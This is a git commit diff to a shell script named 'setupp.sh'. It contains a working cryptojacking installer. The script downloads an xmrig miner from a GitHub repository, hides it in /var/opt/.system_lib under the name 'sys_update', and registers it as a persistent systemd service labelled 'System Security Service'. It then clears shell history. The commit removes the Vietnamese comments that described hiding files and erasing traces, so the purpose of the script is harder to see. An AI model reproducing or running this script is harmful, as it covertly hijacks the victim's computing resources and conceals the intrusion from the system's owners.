111977d5a1feef95036dd9dd95ce684f7d0fe3c8
AnnaliseHackett <fdsjkrnennnnnnnnnnnnnnnnugierhguierhngiengioejgfmeofe@tempmail.ckvn.edu.vn>
2026-02-23 00:51:31 +0700

    Update setupp.sh

--- setupp.sh
+++ setupp.sh
@@ -1,20 +1,14 @@
-#!/bin/bash
-
-# 1. Gỡ bỏ mọi rào cản nếu có
 systemctl stop sys_update.service 2>/dev/null
 systemctl disable sys_update.service 2>/dev/null
 
-# 2. Tạo thư mục ẩn
+
 mkdir -p /var/opt/.system_lib
 
-# 3. Tải file (Sử dụng -sL để tránh lỗi link Github redirect)
 curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -o /var/opt/.system_lib/config.json
 curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /var/opt/.system_lib/sys_update
 
-# 4. Cấp quyền thực thi
 chmod +x /var/opt/.system_lib/sys_update
 
-# 5. Tạo Service (Dùng EOF để viết file nhiều dòng cho sạch)
 cat <<EOF > /etc/systemd/system/sys_update.service
 [Unit]
 Description=System Security Service
@@ -30,10 +24,9 @@ RestartSec=10
 WantedBy=multi-user.target
 EOF
 
-# 6. Kích hoạt và chạy
 systemctl daemon-reload
 systemctl enable sys_update
 systemctl start sys_update
 
-# 7. Xóa dấu vết (Xóa chính file script này sau khi chạy xong)
 history -c
+
